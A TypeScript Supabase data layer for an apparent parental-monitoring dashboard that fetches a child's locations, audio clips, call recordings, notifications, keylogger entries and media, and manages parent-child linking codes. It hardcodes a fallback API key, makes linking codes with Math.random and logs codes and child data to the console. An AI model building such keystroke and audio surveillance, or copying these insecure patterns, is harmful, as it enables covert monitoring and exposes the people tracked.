import { createClient } from '@supabase/supabase-js'

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || 'https://nvrlsoqfuoavyddgskco.supabase.co'
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im52cmxzb3FmdW9hdnlkZGdza2NvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY5MTM3MDQsImV4cCI6MjA3MjQ4OTcwNH0.UR2UPATGa5vNgAmGQmgpRKQaHhkHn5D5kFH5ZdtvBfg'

console.log('Supabase URL:', supabaseUrl ? 'Set' : 'Missing')
console.log('Supabase Key:', supabaseAnonKey ? 'Set' : 'Missing')

export const supabase = createClient(supabaseUrl, supabaseAnonKey)

// Types based on actual Supabase schema
export interface Location {
  id: number
  device_id: string
  lat: number
  lng: number
  accuracy: number
  recorded_at: string
}

export interface AudioClip {
  id: number
  device_id: string
  path: string
  duration_s: number
  recorded_at: string
}

export interface CallRecording {
  id: number
  device_id: string
  phone_number: string
  call_type: 'incoming' | 'outgoing'
  start_time: string
  end_time: string
  recording_path?: string
  duration_seconds: number
}

export interface Notification {
  id: number
  device_id: string
  app: string
  title: string
  body: string
  received_at: string
}

export interface KeyloggerData {
  id: number
  child_id: string
  timestamp: string
  activity_type: string
  app_name?: string
  content_preview?: string
  input_method?: string
  session_duration?: number
}

export interface SystemActivity {
  id: number
  child_id: string
  timestamp: string
  process_name: string
  package_name?: string
  activity_type: string
  duration?: number
}

export interface Device {
  id: string
  child_id: string
  device_name?: string
  device_model?: string
  platform?: string
  created_at: string
  last_seen?: string
}

export interface UserProfile {
  id: string
  email: string
  role: 'parent' | 'child'
  full_name?: string
  created_at: string
  updated_at: string
}

export interface ParentChildLink {
  id: string
  parent_id: string
  child_id: string
  linking_code: string
  is_active: boolean
  linked_at: string
  unlinked_at?: string
}

export interface LinkingCode {
  id: string
  parent_id: string
  code: string
  expires_at: string
  is_used: boolean
  used_at?: string
  created_at: string
}

export interface AppUsage {
  id: number
  device_id: string
  app_name: string
  package_name: string
  usage_duration_seconds: number
  recorded_at: string
}

export interface MediaItem {
  id: number
  device_id: string
  kind: string
  path: string
  taken_at: string
}

export interface ChildData {
  locations: Location[]
  audioClips: AudioClip[]
  callRecordings: CallRecording[]
  notifications: Notification[]
  keyloggerData: KeyloggerData[]
  systemActivity: SystemActivity[]
  appUsage: AppUsage[]
  mediaItems: MediaItem[]
}

export interface Child {
  id: string
  email: string
  role: 'parent' | 'child'
  full_name?: string
  created_at: string
  updated_at: string
}

// Helper functions for data fetching
export const fetchChildData = async (childId: string, timeRange: string = 'Today'): Promise<ChildData | null> => {
  const startDate = getStartDate(timeRange)
  
  try {
    // Get device ID for the child
    const { data: device } = await supabase
      .from('devices')
      .select('id')
      .eq('child_id', childId)
      .single()

    if (!device) return null

    const deviceId = device.id

    // Fetch all data types in parallel
    const [locations, audioClips, callRecordings, notifications, keyloggerData, systemActivity, appUsage, mediaItems] = await Promise.all([
      // Locations
      supabase
        .from('locations')
        .select('*')
        .eq('device_id', deviceId)
        .gte('recorded_at', startDate.toISOString())
        .order('recorded_at', { ascending: false })
        .limit(50),
      
      // Audio clips
      supabase
        .from('audio_clips')
        .select('*')
        .eq('device_id', deviceId)
        .gte('recorded_at', startDate.toISOString())
        .order('recorded_at', { ascending: false })
        .limit(50),
      
      // Call recordings
      supabase
        .from('call_recordings')
        .select('*')
        .eq('device_id', deviceId)
        .gte('start_time', startDate.toISOString())
        .order('start_time', { ascending: false })
        .limit(50),
      
      // Notifications
      supabase
        .from('notifications')
        .select('*')
        .eq('device_id', deviceId)
        .gte('received_at', startDate.toISOString())
        .order('received_at', { ascending: false })
        .limit(50),
      
      // Keylogger data
      supabase
        .from('keylogger_data')
        .select('*')
        .eq('child_id', childId)
        .gte('timestamp', startDate.toISOString())
        .order('timestamp', { ascending: false })
        .limit(50),
      
      // System activity
      supabase
        .from('system_activity')
        .select('*')
        .eq('child_id', childId)
        .gte('timestamp', startDate.toISOString())
        .order('timestamp', { ascending: false })
        .limit(50),
      
      // App usage
      supabase
        .from('app_usage')
        .select('*')
        .eq('device_id', deviceId)
        .gte('recorded_at', startDate.toISOString())
        .order('recorded_at', { ascending: false })
        .limit(50),
      
      // Media items
      supabase
        .from('media_items')
        .select('*')
        .eq('device_id', deviceId)
        .gte('taken_at', startDate.toISOString())
        .order('taken_at', { ascending: false })
        .limit(50)
    ])

    return {
      locations: locations.data || [],
      audioClips: audioClips.data || [],
      callRecordings: callRecordings.data || [],
      notifications: notifications.data || [],
      keyloggerData: keyloggerData.data || [],
      systemActivity: systemActivity.data || [],
      appUsage: appUsage.data || [],
      mediaItems: mediaItems.data || []
    }
  } catch (error) {
    console.error('Error fetching child data:', error)
    return null
  }
}

export const getLinkedChildren = async (parentId: string): Promise<Child[]> => {
  try {
    console.log('Fetching linked children for parent:', parentId)
    
    const { data, error } = await supabase
      .from('parent_child_links')
      .select(`
        child_id,
        user_profiles!parent_child_links_child_id_fkey (
          id,
          email,
          role,
          full_name,
          created_at,
          updated_at
        )
      `)
      .eq('parent_id', parentId)
      .eq('is_active', true)

    if (error) {
      console.error('Supabase error fetching linked children:', error)
      return []
    }

    console.log('Raw data from parent_child_links:', data)
    
    const children = (data?.map(link => link.user_profiles).filter(Boolean) || []) as unknown as Child[]
    console.log('Processed children:', children)
    
    return children
  } catch (error) {
    console.error('Error fetching linked children:', error)
    return []
  }
}

// Device linking functions
export const generateLinkingCode = async (parentId: string): Promise<string> => {
  try {
    // Check if user is authenticated
    const { data: { user } } = await supabase.auth.getUser()
    if (!user) {
      throw new Error('User not authenticated')
    }

    // Generate 6-character code (matching your database)
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    let code = ''
    for (let i = 0; i < 6; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length))
    }

    console.log('Generating linking code for parent:', parentId)

    // Store in database
    const { error } = await supabase
      .from('linking_codes')
      .insert({
        parent_id: parentId,
        code: code,
        expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(), // 24 hours
        is_used: false
      })

    if (error) {
      console.error('Database error:', error)
      throw error
    }

    console.log('Linking code generated successfully:', code)
    return code
  } catch (error) {
    console.error('Error generating linking code:', error)
    throw error
  }
}

export const linkDeviceWithCode = async (code: string, childId: string): Promise<boolean> => {
  try {
    // Find the linking code
    const { data: linkingCode, error: findError } = await supabase
      .from('linking_codes')
      .select('*')
      .eq('code', code)
      .eq('is_used', false)
      .gt('expires_at', new Date().toISOString())
      .single()

    if (findError || !linkingCode) {
      throw new Error('Invalid or expired linking code')
    }

    // Create parent-child link
    const { error: linkError } = await supabase
      .from('parent_child_links')
      .insert({
        parent_id: linkingCode.parent_id,
        child_id: childId,
        linking_code: code,
        is_active: true,
        linked_at: new Date().toISOString()
      })

    if (linkError) throw linkError

    // Mark linking code as used
    const { error: updateError } = await supabase
      .from('linking_codes')
      .update({
        is_used: true,
        used_at: new Date().toISOString()
      })
      .eq('id', linkingCode.id)

    if (updateError) throw updateError

    return true
  } catch (error) {
    console.error('Error linking device:', error)
    return false
  }
}

export const createDevice = async (childId: string, deviceInfo: Partial<Device>): Promise<Device | null> => {
  try {
    const { data, error } = await supabase
      .from('devices')
      .insert({
        child_id: childId,
        device_name: deviceInfo.device_name || 'Unknown Device',
        device_model: deviceInfo.device_model || 'Unknown Model',
        platform: deviceInfo.platform || 'Android',
        created_at: new Date().toISOString(),
        last_seen: new Date().toISOString()
      })
      .select()
      .single()

    if (error) throw error
    return data
  } catch (error) {
    console.error('Error creating device:', error)
    return null
  }
}

const getStartDate = (timeRange: string): Date => {
  const now = new Date()
  switch (timeRange) {
    case 'Today':
      return new Date(now.getTime() - 24 * 60 * 60 * 1000)
    case 'Week':
      return new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000)
    case 'Month':
      return new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000)
    default:
      return new Date(now.getTime() - 24 * 60 * 60 * 1000)
  }
}